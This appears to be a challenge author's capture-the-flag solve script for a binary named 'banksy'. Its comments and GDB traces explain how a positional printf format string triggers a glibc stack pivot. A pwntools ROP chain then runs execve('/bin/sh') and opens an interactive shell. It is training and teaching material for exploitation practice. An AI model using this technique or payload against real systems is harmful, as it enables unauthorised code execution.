from pwn import *

# The first thing we have to do to solve this is to find the following file (given in hint eventually):
# https://github.com/bminor/glibc/blob/master/stdio-common/vfprintf-internal.c
# and take a look at the commit messages:
# https://github.com/bminor/glibc/commit/6caddd34bd7ffb5ac4f36c8e036eee100c2cc535#diff-5a23cc90fb9cf1eb9388dc08e7c80c8d629edc0b380b212acb7ed5aaaf4b417b
# We see that there is a BIG BUG being fixed here. Basically, if you call printf with this string:
# "%2$.2147483616$p"
# printf_positional will undergo a stack pivot on x86 32 bit architectures.
# This stack pivot has high probability of landing in the mapped area.

# Now for how the exploit works. 
# We get to choose where to stop the program and overwrite. 
# We can't stop it at printf_positional's ret, because the stack reverts before then.
# We can stop it at any ret from the time the stack is pivoted (at printf_positional+1709) until it reverts (at printf_positional+975) though.
# The easiest one is at _itoa_word+160 (0x0808c9f0). We can stop there and overwrite the mmapped chunk with our code.
# Theoretically, that chunk should be where the stack is pivoted, meaning once we `ret`, we have hijacking.
# Because the stack pivot is probablistic in nature, we may need to try multiple times.
# So with inputs:
# "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
# "0x808c9f0"
# "%2$.2147483616$p"
# We end up with a little something like this:
"""
   0x805221d <printf_positional+1709>    sub    esp, esi
 ► 0x805221f <printf_positional+1711>    mov    esi, dword ptr [ebp - 0x87c]
    ↓
   0x8052229 <printf_positional+1721>    and    eax, 0xfffffff0
   0x805222c <printf_positional+1724>    cmp    esi, ebx
   0x805222e <printf_positional+1726>    lea    edx, [esi + 0x20]
   0x8052231 <printf_positional+1729>    jge    printf_positional+1734 <printf_positional+1734>
 
   0x8052233 <printf_positional+1731>    lea    edx, [ebx + 0x20]
   0x8052236 <printf_positional+1734>    add    eax, edx
   0x8052238 <printf_positional+1736>    xor    ecx, ecx
   0x805223a <printf_positional+1738>    mov    dword ptr [ebp - 0x894], eax
   0x8052240 <printf_positional+1744>    mov    dword ptr [ebp - 0x888], ecx
──────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────
00:0000│ esp  0x7fffb1f0 ◂— 0x0
"""
# Just take a look at that stack! Now the question is whether it falls within 0x1000000 of 0x7f900000
# 0x7fffb1f0-0x7f900000 = 0x6fb1f0, so yes it does!
# We then continue until we get to the actual exploit location:
"""
   0x808c9ef <_itoa_word+159>            pop    edi
 ► 0x808c9f0 <_itoa_word+160>            ret             <0x8052577; printf_positional+2567>
    ↓
   0x8052579 <printf_positional+2569>    mov    edx, eax
   0x805257b <printf_positional+2571>    jae    printf_positional+7712 <printf_positional+7712>
 
   0x8052581 <printf_positional+2577>    mov    ecx, dword ptr [ebp - 0x878]
   0x8052587 <printf_positional+2583>    sub    ebx, eax
   0x8052589 <printf_positional+2585>    mov    eax, 0x7ffffffe
   0x805258e <printf_positional+2590>    mov    dword ptr [ebp - 0x890], edi
   0x8052594 <printf_positional+2596>    xor    esi, esi
   0x8052596 <printf_positional+2598>    mov    edi, dword ptr [ebp - 0x874]
   0x805259c <printf_positional+2604>    mov    dword ptr [ebp - 0x87c], ebx
──────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────
00:0000│ esp  0x7fffb1dc —▸ 0x8052577 (printf_positional+2567) ◂— cmp    eax, ebx
01:0004│      0x7fffb1e0 —▸ 0x7fffffe0 ◂— 0x0
02:0008│      0x7fffb1e4 —▸ 0xffffbb28 ◂— 0x0
03:000c│      0x7fffb1e8 ◂— 0xa /* '\n' */
04:0010│      0x7fffb1ec ◂— 0x0
... ↓
────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────
 ► f 0  808c9f0 _itoa_word+160
   f 1  8052577 printf_positional+2567
   f 2  80547fd __vfprintf_internal+861
   f 3  80511d5 fprintf+37
   f 4  8048aea exploit_me+149
   f 5  8048d74 main+610
   f 6  804997d __libc_start_main+1165
"""
# And....sweet! If I wasn't in GDB, this would have worked. We have a ret, our stack is pivoted, all we need is the overwrite (which I gave you).
# The below is a sketch of the exploit with a proof of vulnerability.
# Don't yell at me please, I know this challenge was guessy. I was so excited to have a novel libc exploit that I forgot to make it....fun :)
# Hopefully you enjoy seeing the stupidity that is this pwnable.

binary = "../dist/banksy"
elf = ELF(binary)
target_addr = elf.symbols['_itoa_word'] + 160 # _itoa_word+160 in gdb
printf_payload = "%2$.2147483616$p"

# Gadgets (These addresses are likely slightly off because I changed the print statements but you can find the gadgets with ROPGadget)
# Oh also, this exploit is slightly probablistic in that we're gonna land at a random place in our buffer....0x30 isn't too much space though
# So I'm sure you can figure it out!
syscall = 0x08049bc2 # int 0x80
xoreaxeax = 0x0805ffb0 # xor eax, eax; ret
popeax = 0x080bd4fd # pop eax; ret
popebx = 0x080481c9 # pop ebx; ret
popjmp = 0x080b0270 # pop edx ; pop ecx ; pop eax ; jmp dword ptr [eax]

# execve("/bin/sh\x00", NULL, NULL); ## Execve = syscall 0xb
# eax -> 0x0b
# ebx -> const char * filename
# ecx -> const char * const * argv
# edx -> const char * const * envp

start_addr = 0x7f900000 # We know the mmap is here

part1 = b""
part1 += p32(popjmp)
part1 += p32(0)
part1 += p32(0)
part1 += p32(start_addr + 4)

part2 = b""
part2 += p32(popeax)
part2 += p32(0x0b)
part2 += p32(popebx)
part2 += p32(start_addr)
part2 += p32(syscall)

chain = b""
chain += b"/bin/sh\x00" # placed at 0x7f900000
chain += part2
chain += b"\x90" * (0x30 - (len(chain) + len(part1)))
chain += part1
print(chain)

p = process(binary)
p.sendline(chain) # This chain will likely not work perfectly for you!
# But you get the idea. We ret to a ropchain and we have libc statically compiled, so it should be pretty easy.
p.sendline("0x" + str(hex(target_addr))) # This is where we want to stop at
p.sendline(printf_payload) # This is the "exploit" string that makes printf do the thing
p.interactive()
